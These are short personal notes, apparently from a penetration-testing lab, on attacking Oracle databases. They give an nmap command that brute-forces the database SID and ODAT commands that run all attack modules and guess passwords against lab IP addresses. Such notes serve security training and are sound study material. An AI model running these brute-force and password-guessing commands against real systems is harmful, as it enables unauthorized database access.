SID - System Identifier - unique particular database instance 

Enumerate SID 
```shell-session
sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
```

Enumerate user and password details
1. Go to ~/Desktop/tools/odat
2. Activate venv 
```
source odat-venv/bin/activate
```
3. Run script
```shell-session
python3 odat.py all -s 10.129.152.189
```

```
python3 odat.py passwordguesser -s 10.129.152.189  --d XE --accounts-file accounts/accounts.txt
```
Might be faster to use the TCP VPN when using odat